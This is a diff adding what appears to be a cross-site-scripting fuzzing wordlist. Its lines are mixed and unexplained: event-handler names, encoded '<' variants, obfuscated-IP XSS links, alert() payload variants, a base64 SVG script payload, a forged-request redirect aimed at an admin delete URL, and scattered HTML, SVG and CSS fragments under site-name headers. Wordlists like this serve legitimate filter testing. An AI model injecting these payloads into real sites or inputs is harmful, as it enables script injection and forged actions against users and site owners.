@@ -1,0 +1,428 @@
+<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
+onwebkitanimationiteration
+ontouchmove
+onselect
+onprogress
+onplaying
+onmouseout
+onkeyup
+onfocus
+ondragexit
+onclick
+onbeforeprint
+onafterprint
+#Yandex:
+&#X0003C;
+&#x000003C;
+&#x03C
+&#X0003c
+&#x000003c
+&#060;
+&lt;
+</BODY></HTML>
++ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-
+a29b1%3balert(888)//a62b7156d82
+</xmp>
+});
+</body>
+<div id="113"><div id="x">XXX</div>
+*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */
+[B]
+<x </onxxx=1
+<X OnXxx=1
+<x%09onxxx=1
+<%78 onxxx=1
+onUnload
+onSelectionChange
+onResume
+onPopState
+onMouseUp
+onLoseCapture
+onFocusIn
+onDragLeave
+onCut
+onBeforeUpdate
+onAfterPrint
+<A HREF="http://1113982867/">XSS</A>
+ontransitionrun
+onstart
+onresize
+onpointermove
+onmozfullscreenchange
+onloadstart
+onfullscreenchange
+ondrop
+oncuechange
+onbegin
+onanimationiteration
+\x3C
+&#X0003C
+&#x000003C
+&#X03c;
+&#x0003c;
+&#0000060;
+&#060
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<input type="submit">
+});
+<a class=bar href="http://www.example.org">www.example.org</a>
+        window.open('popup.html','spam'+i,'width=50,height=50');
+</feImage>
+[D]
+<x%0Aonxxx=1
+<x %6Fnxxx=1
+<x%2Fonxxx=1
+<x onxxx%3D1
+onSubmit
+onRowInserted
+onRedo
+onMoveStart
+onMouseDown
+onInput
+onEnd
+onDblClick
+onCellChange
+onBeforeCut
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+onwebkitanimationend
+ontouchend
+onseeking
+onpopstate
+onplay
+onmousemove
+onkeypress
+onfinish
+ondragenter
+onchange
+onbeforeinput
+#Twitter.com:
+&#X003C;
+&#x00003C;
+&#x3C
+&#X003c
+&#x00003c
+&#60;
+&lt
+</HTML>
+<%
+<br/><hr/>
+    <circle fill="red" r="40"></circle>
+<xml:namespace prefix="t">
+<x 1="1"onxxx=1
+<x OnXxx=1
+<http://onxxx%3D1/
+<x/onxxx=1
+onUndo
+onSelectStart
+onResizeStart
+onPause
+onMouseOver
+onLoad
+onFocus
+onDragEnter
+onCopy
+onBeforeUnload
+onActivate
+<A HREF="http://66.102.7.147/">XSS</A>
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+onwebkittransitionend
+ontransitioncancel
+onselectstart
+onrepeat
+onpointerenter
+onmouseup
+onloadeddata
+onfocusout
+ondragover
+oncontextmenu
+onbeforetoggle
+onanimationcancel
+&#X000003C;
+&#X03C
+&#x0003C
+&#X000003c
+&#x03c;
+&#00060;
+&LT;
+<input name="password" type="password" value="secret" />
+<div id="131"><b>drag and drop one of the following strings to the drop box:</b>
+  id    ID    #REQUIRED>]>
+function makePopups(){
+<div id="117"><a href="http://attacker.org">
+#x{font-family:foo[bar;color:green;}
+[C]
+<http://onxxx%3D1/
+<x/onxxx=1
+<x%0Conxxx=1
+<x o%6Exxx=1
+alert`1`
+onStop
+onRowDelete
+onPropertyChange
+onMove
+onMediaError
+onHashChange
+onDragStart
+onDataSetChanged
+onBlur
+onBeforeActivate
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+onunhandledrejection
+onsuspend
+onscrollend
+onpointerover
+onpageshow
+onmousedown
+oninput
+onend
+ondblclick
+onbounce
+onauxclick
+#GoogleAPI's
+#Uber.com:
+&#X000003C
+&#x03C;
+&#X0003c;
+&#x000003c;
+&#x03c
+&#00060
+<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
+<input type=text value=“XSS”>
+<br>
+<math>
+}
+    <h1>Drop me</h1>
+<div id="91">[A]
+<body>Hello</body>
+<x%0Donxxx=1
+<x on%78xx=1
+<x 1="1"onxxx=1
+<x OnXxx=1
+(alert)(1)
+onTimeError
+onScroll
+onReset
+onOnline
+onMouseLeave
+onKeyPress
+onErrorUpdate
+onDrag
+onClick
+onBeforeEditFocus
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+onvolumechange
+ontoggle
+onseeked
+onpointerup
+onpause
+onmouseleave
+onkeydown
+onerror
+ondragend
+oncanplaythrough
+onbeforecut
+#AOL/Yahoo
+#AlibabaGroup:
+#Blogger.com:
+&#X03C;
+&#x0003C;
+&#X000003c;
+&#X03c
+&#x0003c
+&#0000060
+%3C
+  <xss:xss>XSS</xss:xss>
+48e71%3balert(1)//503466e3
+<circle r="400"></circle>
+</template>
+<div id="134"><xmp>
+<body>
+<div id="116"><div id="x">x</div>
+<x 1='1'onxxx=1
+<X onxxx=1
+<x onxxx=1 onxxx=1
+[1].find(alert)
+onURLFlip
+onSelect
+onResizeEnd
+onPaste
+onMouseOut
+onLayoutComplete
+onFinish
+onDragEnd
+onControlSelect
+onBeforePrint
+onAbort
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+onwheel
+ontransitionend
+onshow
+onreset
+onpointerleave
+onmousewheel
+onloadedmetadata
+onformdata
+ondragstart
+oncopy
+onbeforeunload
+onanimationend
+#Others:
+#VK.com:
+#Google.com:
+\x3c
+&#X003C
+&#x00003C
+&#X3c;
+&#x003c;
+&#000060;
+&#60
+x='<%'
+<br/><hr/>
+-->
+<div id="123"><span class=foo>Some text</span>
+    for (i=1;i<6;i++) {
+#y];color:red;{}
+<a id="x"><rect fill="white" width="1000" height="1000"/></a>
+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>
+@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}
+<x%09onxxx=1
+<%78 onxxx=1
+<x%0Donxxx=1
+<x on%78xx=1
+alert&lpar;1&rpar;
+onStorage
+onRowExit
+onReadyStateChange
+onMoveEnd
+onMessage
+onHelp
+onDrop
+onDataSetComplete
+onBounce
+onBeforeCopy
+<h1>INJECTX</h1>
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<A HREF="http://66.102.7.147/">XSS</A>
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+ontransitionstart
+onsubmit
+onscroll
+onpointerout
+onpagehide
+onmessage
+onhashchange
+ondurationchange
+oncut
+onblur
+onanimationstart
+#Marketo.com
+&#X00003C
+&#x3C;
+&#X003c;
+&#x00003c;
+&#x3c
+&#0060
+<![endif]-->
+</image>
+<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
+<br/><hr/>
+    }
+</head>
+<x%0Conxxx=1
+<x o%6Exxx=1
+<x 1='1'onxxx=1
+<X onxxx=1
+navigator.vibrate(500)
+onSyncRestored
+onRowsEnter
+onRepeat
+onOffline
+onMouseEnter
+onKeyDown
+onError
+onDeactivate
+onChange
+onBeforeDeactivate
+onwebkitanimationstart
+ontouchstart
+onselectionchange
+onratechange
+onpointerdown
+onmouseover
+onload
+onfocusin
+ondragleave
+onclose
+onbeforescriptexecute
+onafterscriptexecute
+&#X00003C;
+&#X3C
+&#x003C
+&#X00003c
+&#x3c;
+&#0060;
+&LT
+<input name="username" value="admin" />
+-->{}
+<br/><hr/>
+Same effect with
+<!ATTLIST xsl:stylesheet
+<feImage>
+<head>
+<x onxxx=1 onxxx=1
+<x%0Aonxxx=1
+<x %6Fnxxx=1
+seekSegmentTime
+onStart
+onReverse
+onProgress
+onMouseWheel
+onMediaComplete
+onFocusOut
+onDragOver
+onDataAvailable
+onBegin
+onAfterUpdate
+<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
+<A HREF="http://1113982867/">XSS</A>
+onunload
+ontimeupdate
+onsearch
+onpointerrawupdate
+onpaste
+onmouseenter
+oninvalid
+onended
+ondrag
+oncanplay
+onbeforecopy
+&#X3C;
+&#x003C;
+&#X00003c;
+&#X3c
+&#x003c
+&#000060
+<
+XXX
+<input name="secret" type="password">
+<br/><hr/>
+        </xsl:template>
+</div>
+*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */
+<x%2Fonxxx=1
+<x onxxx%3D1
+<x </onxxx=1
+<X OnXxx=1
+a=alert,a(1)
+onTrackChange
+onSeek
+onResize
+onOutOfSync
+onMouseMove
+onKeyUp
+onFilterChange
+onDragDrop
+onContextMenu
+onBeforePaste
+FSCommand
